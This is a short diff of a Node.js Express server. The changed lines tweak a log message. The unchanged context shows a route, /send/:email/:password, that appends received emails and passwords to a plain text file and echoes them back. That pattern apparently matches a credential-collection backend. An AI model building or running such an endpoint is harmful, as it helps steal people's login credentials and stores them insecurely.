@@ -5,9 +5,10 @@ const app = express();
 const port = 8080;
 
 const doc = fs.createWriteStream('doc.txt')
-doc.write('new doc created!\n')
+doc.write('file created!\n')
 
 app.get('/send/:email/:password', (req, res) => {
+    console.log('loading...')
     doc.write(`email: ${req.params.email}\npassword: ${req.params.password}\n\n`)
     res.send('sent ' + req.params.email + 'and ' + req.params.password);
 
